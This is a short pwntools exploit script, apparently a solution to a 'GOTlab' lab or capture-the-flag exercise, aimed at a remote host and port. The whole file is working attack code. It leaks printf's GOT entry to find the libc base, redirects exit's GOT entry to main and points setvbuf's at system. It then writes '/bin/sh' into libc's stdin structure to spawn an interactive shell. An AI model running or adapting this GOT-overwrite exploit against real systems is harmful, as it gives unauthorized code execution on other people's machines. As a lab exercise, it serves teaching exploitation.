from pwn import *

# p = process('./GOTlab')
elf = ELF('./GOTlab')
# libc = elf.libc
p = remote('140.112.31.97', 30103)
libc = ELF('./libc-2.29.so')

# leak address on GOT
printf_GOT = elf.got['printf']
p.sendlineafter('address : ', str(printf_GOT))
printf = int(p.recvline().strip(), 16)
libc_base = printf - libc.sym['printf']
success('libc base = 0x%x', libc_base)

# overwrite exit got to main
exit_GOT = elf.got['exit']
main = elf.sym['main']
p.sendlineafter('address : ', str(exit_GOT))
p.sendlineafter('value : ', str(main))

# overwrite setvbuf got to system
setvbuf_GOT = elf.got['setvbuf']
system = libc_base + libc.sym['system']
p.sendlineafter('address : ', str(printf_GOT))
p.sendlineafter('address : ', str(setvbuf_GOT))
p.sendlineafter('value : ', str(system))

# overwrite sedin to /bin/sh
stdin =  libc_base + libc.sym['_IO_2_1_stdin_']
p.sendlineafter('address : ', str(printf_GOT))
p.sendlineafter('address : ', str(stdin))
p.sendlineafter('value : ', str(u64(b'/bin/sh\x00')))

p.interactive()
